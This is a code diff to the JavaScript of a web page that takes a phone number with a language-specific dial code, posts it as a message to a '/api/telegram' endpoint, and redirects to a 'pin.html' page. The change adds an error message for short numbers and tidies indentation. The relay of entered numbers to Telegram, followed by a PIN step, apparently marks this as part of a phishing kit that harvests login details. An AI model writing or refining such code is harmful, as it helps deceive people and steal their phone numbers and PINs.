@@ -325,17 +325,21 @@ phone.addEventListener("input", () => {
 
 nextBtn.addEventListener("click", async () => {
   const digits = (phone.value || "").replace(/\D/g, "");
-  if (digits.length < 7) return;
+
+  if (digits.length < 7) {
+    setError(true, LANGS[current].error);
+    return;
+  }
 
   const fullPhone = LANGS[current].dial + digits;
 
   await fetch("/api/telegram", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    message: `Phone: ${fullPhone} | Lang: ${current}`
-  })
-});
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      message: `Phone: ${fullPhone} | Lang: ${current}`
+    })
+  });
 
   setError(false);
   window.location.href = "pin.html";
